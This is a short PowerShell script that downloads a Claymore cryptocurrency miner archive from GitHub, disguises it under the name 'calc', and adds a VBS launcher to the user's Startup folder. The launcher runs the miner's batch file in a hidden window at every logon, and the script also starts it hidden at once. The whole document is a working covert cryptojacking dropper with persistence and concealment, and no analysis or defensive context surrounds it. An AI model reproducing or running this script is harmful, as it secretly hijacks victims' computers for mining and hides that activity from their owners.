[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$url = "https://github.com/3xk0pt3r/Mining/raw/master/Claymorev11.8.zip";$output = "C:\Users\Public\Downloads\calc.zip";$wc = New-Object System.Net.WebClient;$wc.DownloadFile($url, $output)
Get-ChildItem 'C:\Users\Public\Downloads\calc.zip' | Expand-Archive -DestinationPath 'C:\Users\Public\Downloads\'
mv "C:\Users\Public\Downloads\Claymorev11.8" "C:\Users\Public\Downloads\calc"
echo 'WScript.CreateObject("WScript.Shell").Run "C:\Users\Public\Downloads\calc\s.bat", 0 , false' > "C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hura.vbs"
$A = Start-Process -FilePath C:\Users\public\Downloads\calc\s.bat -WindowStyle Hidden;